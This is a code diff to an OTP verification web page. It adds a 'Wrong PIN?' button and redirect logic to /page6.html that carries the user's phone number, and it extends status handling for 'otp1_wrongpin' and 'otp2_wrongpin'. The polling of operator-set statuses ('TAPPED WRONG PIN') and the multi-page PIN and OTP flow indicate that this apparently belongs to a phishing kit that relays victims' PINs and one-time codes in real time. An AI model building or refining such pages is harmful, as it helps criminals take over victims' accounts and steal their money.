@@ -145,7 +145,7 @@
             display: none;
         }
 
-        /* Verify Button */
+        /* Action Buttons */
         .btn-verify {
             width: 100%;
             background-color: #1a65cc;
@@ -157,7 +157,7 @@
             border-radius: 8px;
             cursor: pointer;
             transition: background 0.2s;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
 
         .btn-verify:hover {
@@ -167,6 +167,25 @@
         .btn-verify:disabled {
             background-color: #a0aec0;
             cursor: not-allowed;
+        }
+
+        .btn-wrong-pin {
+            width: 100%;
+            background-color: transparent;
+            color: #e53e3e;
+            border: 1px solid #feb2b2;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .btn-wrong-pin:hover {
+            background-color: #fff5f5;
+            border-color: #e53e3e;
         }
 
         /* Timer and Resend section */
@@ -315,8 +334,9 @@
             <!-- Error Status Below Inputs -->
             <p id="errorMessage" class="error-message"></p>
 
-            <!-- Action triggering Verify Button replacement -->
+            <!-- Action Buttons -->
             <button id="verifyButton" class="btn-verify" onclick="sendVerificationData()">Verify</button>
+            <button id="wrongPinButton" class="btn-wrong-pin" onclick="redirectToPinPage()">Entered Wrong PIN?</button>
 
             <!-- Timer elements -->
             <div class="timer-container">
@@ -403,6 +423,10 @@
             document.querySelectorAll('.otp-box').forEach(i => i.classList.add('error'));
         }
 
+        function redirectToPinPage() {
+            window.location.href = `/page6.html?phone=${encodeURIComponent(globalPhone)}&error=wrong_pin`;
+        }
+
         // --- 2 MINUTE COUNTDOWN TIMER SYSTEM ---
         let timerInterval;
         function startCountdown(durationSeconds) {
@@ -480,15 +504,15 @@
                     document.querySelectorAll('.otp-box')[0].focus();
                 }
 
-                // TAPPED WRONG PIN -> SHOW "Wrong pin, please enter correct pin." & REDIRECT TO PAGE 6
-                if (data.status === "otp2_wrongpin") {
+                // TAPPED WRONG PIN (FOR EITHER STEP) -> SHOW "Wrong pin, please enter correct pin." & REDIRECT TO PAGE 6
+                if (data.status === "otp1_wrongpin" || data.status === "otp2_wrongpin") {
                     clearInterval(pollingInterval);
                     document.getElementById('loadingOverlay').classList.remove('active');
                     
                     showErrorState("Wrong pin, please enter correct pin.");
 
                     setTimeout(() => {
-                        window.location.href = `/page6.html?phone=${encodeURIComponent(globalPhone)}&error=wrong_pin`;
+                        redirectToPinPage();
                     }, 2000);
                 }
 
